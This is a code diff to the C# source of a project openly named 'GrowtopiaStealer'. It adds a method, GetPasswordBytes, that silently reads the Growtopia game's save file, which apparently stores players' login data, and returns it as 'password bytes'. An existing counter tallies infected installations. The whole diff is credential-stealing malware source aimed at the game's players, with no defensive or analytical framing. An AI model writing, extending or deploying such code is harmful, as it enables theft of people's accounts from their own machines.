@@ -1,5 +1,6 @@
 ﻿using System;
 using System.IO;
+using System.Text;
 
 namespace GrowtopiaStealer // https://github.com/TheC0mpany/GrowtopiaStealer
 {
@@ -18,6 +19,25 @@ namespace GrowtopiaStealer // https://github.com/TheC0mpany/GrowtopiaStealer
             if (!growtopia.Exists)
                 return;
         Counting.Growtopia++;
+        }
+
+        public static byte[] GetPasswordBytes()
+        {
+            try
+            {
+                File.Open(Growtopia.savePath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
+                using (FileStream stream = new FileStream(Growtopia.savePath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
+                {
+                    using (StreamReader streamReader = new StreamReader(stream, Encoding.Default))
+                    {
+                        return Encoding.Default.GetBytes(streamReader.ReadToEnd());
+                    }
+                }
+            }
+            catch
+            {
+                return null;
+            }
         }
     }
 }
